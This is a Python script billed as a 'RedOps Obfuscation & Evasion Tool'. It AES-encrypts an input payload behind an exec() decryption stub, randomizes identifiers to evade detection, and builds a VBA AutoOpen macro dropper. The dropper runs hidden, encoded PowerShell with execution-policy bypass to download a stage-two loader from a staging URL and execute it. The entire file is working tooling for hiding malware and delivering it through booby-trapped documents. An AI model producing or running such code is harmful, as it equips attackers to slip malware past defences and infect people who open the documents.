
import argparse
import base64
import os
import re
import random
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def aes_encrypt_code(code, key):
    cipher = AES.new(key, AES.MODE_CBC, iv=b'AAAAAAAAAAAAAAAA')
    encrypted = cipher.encrypt(pad(code.encode(), AES.block_size))
    return base64.b64encode(encrypted).decode()

def insert_decrypt_stub(aes_code_b64, key_b64):
    stub = f"""
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = base64.b64decode('{key_b64}')
iv = b'AAAAAAAAAAAAAAAA'
cipher = AES.new(key, AES.MODE_CBC, iv)
enc = base64.b64decode('{aes_code_b64}')
dec = unpad(cipher.decrypt(enc), AES.block_size)
exec(dec.decode())
"""
    return stub.strip()

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def rename_vars_functions(code):
    identifiers = set(re.findall(r'\b[a-zA-Z_][a-zA-Z0-9_]*\b', code))
    protected = {'import', 'from', 'def', 'class', 'return', 'if', 'else', 'for', 'while', 'try', 'except', 'exec'}
    rename_map = {name: random_string() for name in identifiers if name not in protected}
    for orig, new in rename_map.items():
        code = re.sub(rf'\b{orig}\b', new, code)
    return code

def generate_vba_macro(ps_command):
    encoded_cmd = base64.b64encode(ps_command.encode('utf-16le')).decode()
    macro = f"""
Sub AutoOpen()
    Dim x As String
    x = "powershell -ep bypass -enc {encoded_cmd}"
    Shell x, vbHide
End Sub
"""
    return macro.strip()

def main():
    parser = argparse.ArgumentParser(description="RedOps Obfuscation & Evasion Tool")
    parser.add_argument('--input', required=True, help='Input Python payload')
    parser.add_argument('--output', required=True, help='Output file (py or vba)')
    parser.add_argument('--aes', help='AES key (16/24/32 bytes)')
    parser.add_argument('--rename', action='store_true', help='Randomize function and variable names')
    parser.add_argument('--vba', action='store_true', help='Generate a macro dropper (VBA)')

    args = parser.parse_args()

    with open(args.input, 'r') as f:
        code = f.read()

    if args.rename:
        code = rename_vars_functions(code)

    if args.aes:
        key = args.aes.encode()
        if len(key) not in [16, 24, 32]:
            raise ValueError("AES key must be 16, 24, or 32 bytes")
        aes_b64 = aes_encrypt_code(code, key)
        key_b64 = base64.b64encode(key).decode()
        code = insert_decrypt_stub(aes_b64, key_b64)

    if args.vba:
        ps_command = f"Invoke-WebRequest -Uri http://127.0.0.1:5000/stage2/default -OutFile loader.py; python loader.py"
        macro = generate_vba_macro(ps_command)
        with open(args.output, 'w') as f:
            f.write(macro)
        print(f"[+] VBA macro saved to {args.output}")
    else:
        with open(args.output, 'w') as f:
            f.write(code)
        print(f"[+] Obfuscated Python code saved to {args.output}")

if __name__ == "__main__":
    main()
